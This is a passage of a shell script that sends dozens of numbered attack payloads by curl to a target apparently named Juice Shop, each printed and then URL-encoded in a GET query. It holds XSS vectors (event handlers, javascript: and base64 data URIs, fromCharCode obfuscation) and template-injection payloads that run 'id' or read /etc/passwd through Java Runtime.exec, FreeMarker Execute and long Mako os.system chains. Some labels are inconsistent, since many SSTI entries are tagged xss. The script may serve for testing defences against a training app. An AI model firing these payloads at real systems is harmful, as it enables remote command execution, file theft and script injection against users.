printf '    payload: %s\n' '&#x3C;img src=x onerror=alert('\''Payload1'\'')&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bimg%20src%3Dx%20onerror%3Dalert%28%27Payload1%27%29%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0200 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;svg onload=alert('\''Payload2'\'')&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bsvg%20onload%3Dalert%28%27Payload2%27%29%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0201 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;object data=javascript:alert('\''Payload3'\'')&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bobject%20data%3Djavascript%3Aalert%28%27Payload3%27%29%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0202 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;body onload=alert('\''Payload4'\'')&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bbody%20onload%3Dalert%28%27Payload4%27%29%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0203 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;img src=x:alert(alt) onerror=eval(src) alt='\''Payload5'\''&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bimg%20src%3Dx%3Aalert%28alt%29%20onerror%3Deval%28src%29%20alt%3D%27Payload5%27%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0204 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;script&#x3E;eval(String.fromCharCode(97,108,101,114,116,40,39,Payload6,39,41))&#x3C;/script&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bscript%26%23x3E%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C39%2CPayload6%2C39%2C41%29%29%26%23x3C%3B%2Fscript%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0205 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;!--%2Balert('\''Payload7'\'')%2B--&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3B%21--%252Balert%28%27Payload7%27%29%252B--%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0206 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;style&#x3E;*\{x:expression(alert('\''Payload8'\''))\}&#x3C;/style&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bstyle%26%23x3E%3B%2A%5C%7Bx%3Aexpression%28alert%28%27Payload8%27%29%29%5C%7D%26%23x3C%3B%2Fstyle%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0207 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;input value=`` onfocus=alert('\''Payload9'\'') autofocus&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Binput%20value%3D%60%60%20onfocus%3Dalert%28%27Payload9%27%29%20autofocus%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0208 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;form&#x3E;&#x3C;button onclick=alert('\''Payload10'\'')&#x3E;X&#x3C;/button&#x3E;&#x3C;/form&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bform%26%23x3E%3B%26%23x3C%3Bbutton%20onclick%3Dalert%28%27Payload10%27%29%26%23x3E%3BX%26%23x3C%3B%2Fbutton%26%23x3E%3B%26%23x3C%3B%2Fform%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0209 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;iframe src=javascript:alert('\''Payload11'\'')&#x3E;&#x3C;/iframe&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Biframe%20src%3Djavascript%3Aalert%28%27Payload11%27%29%26%23x3E%3B%26%23x3C%3B%2Fiframe%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0210 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;a href=javascript:alert('\''Payload12'\'')&#x3E;Link&#x3C;/a&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Ba%20href%3Djavascript%3Aalert%28%27Payload12%27%29%26%23x3E%3BLink%26%23x3C%3B%2Fa%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0211 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUGF5bG9hZDEzJyk8L3NjcmlwdD4&#x3E;Link&#x3C;/a&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Ba%20href%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnUGF5bG9hZDEzJyk8L3NjcmlwdD4%26%23x3E%3BLink%26%23x3C%3B%2Fa%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0212 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;div onmouseover=alert('\''Payload14'\'')&#x3E;Hover over me&#x3C;/div&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bdiv%20onmouseover%3Dalert%28%27Payload14%27%29%26%23x3E%3BHover%20over%20me%26%23x3C%3B%2Fdiv%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0213 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;input type=image src=x onerror=alert('\''Payload15'\'')&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Binput%20type%3Dimage%20src%3Dx%20onerror%3Dalert%28%27Payload15%27%29%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0214 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;audio src=javascript:alert('\''Payload16'\'')&#x3E;&#x3C;/audio&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Baudio%20src%3Djavascript%3Aalert%28%27Payload16%27%29%26%23x3E%3B%26%23x3C%3B%2Faudio%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0215 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&#x3C;video src=javascript:alert('\''Payload17'\'')&#x3E;&#x3C;/video&#x3E;'
curl -sk -i -m 15 "$HOST$URI?q=%26%23x3C%3Bvideo%20src%3Djavascript%3Aalert%28%27Payload17%27%29%26%23x3E%3B%26%23x3C%3B%2Fvideo%26%23x3E%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0216 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '<%= 7 * 7 %>'
curl -sk -i -m 15 "$HOST$URI?q=%3C%25%3D%207%20%2A%207%20%25%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0217 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '$\{7*7\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7B7%2A7%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0218 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{T(java.lang.Runtime).getRuntime().exec('\''id'\'')\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0219 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '%7B%7B7*7%7D%7D'
curl -sk -i -m 15 "$HOST$URI?q=%257B%257B7%2A7%257D%257D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0220 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '%24%7B7*7%7D'
curl -sk -i -m 15 "$HOST$URI?q=%2524%257B7%2A7%257D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0221 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '$\{3*3\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7B3%2A3%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0222 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '$\{\{7*7\}\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7B%5C%7B7%2A7%5C%7D%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0223 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '@(1+2)'
curl -sk -i -m 15 "$HOST$URI?q=%40%281%2B2%29" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0224 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<%= File.open('\''/etc/passwd'\'').read %>'
curl -sk -i -m 15 "$HOST$URI?q=%3C%25%3D%20File.open%28%27%2Fetc%2Fpasswd%27%29.read%20%25%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0225 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '<#assign ex = "freemarker.template.utility.Execute"?new()>$\{ ex("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%5C%7B%20ex%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0226 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '[#assign ex = '\''freemarker.template.utility.Execute'\''?new()]$\{ ex('\''id'\'')\}'
curl -sk -i -m 15 "$HOST$URI?q=%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%5C%7B%20ex%28%27id%27%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0227 | tuning=ssti | method=GET-querystring ==="
printf '    payload: %s\n' '$\{"freemarker.template.utility.Execute"?new()("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0228 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{T(java.lang.System).getenv()\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7BT%28java.lang.System%29.getenv%28%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0229 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{T(java.lang.Runtime).getRuntime().exec('\''cat etc/passwd'\'')\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc%2Fpasswd%27%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0230 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())\}$\{self.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%5C%7D%24%5C%7Bself.module.cache.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0231 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0232 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.cache.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0233 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0234 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.__init__.__globals__['\''util'\''].os.system('\''id'\'')\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.__init__.__globals__%5B%27util%27%5D.os.system%28%27id%27%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0235 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0236 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0237 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0238 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0239 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.__init__.__globals__['\''os'\''].system('\''id'\'')\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.__init__.__globals__%5B%27os%27%5D.system%28%27id%27%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0240 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.cache.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.cache.util.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0241 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.runtime.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.util.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0242 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.cache.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0243 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0244 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.cache.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.cache.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0245 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.runtime.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0246 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.cache.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0247 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0248 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0249 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.filters.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.filters.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0250 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.runtime.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0251 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0252 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.runtime.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0253 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.cache.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0254 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.runtime.exceptions.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0255 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.cache.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.cache.util.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0256 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.runtime.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0257 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.cache.util.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.cache.util.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0258 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.util.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0259 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.runtime.util.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.util.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0260 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.runtime.exceptions.traceback.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.traceback.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0261 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.module.runtime.exceptions.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.util.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0262 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0263 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.cache.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.cache.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0264 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.template.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.template.module.cache.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0265 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0266 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0267 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0268 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0269 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.filters.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.filters.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0270 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0271 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.template.module.runtime.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0272 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.context._with_template._mmarker.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.context._with_template._mmarker.module.cache.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0273 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.exceptions.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.exceptions.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0274 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0275 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0276 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0277 | tuning=xss | method=GET-querystring ==="
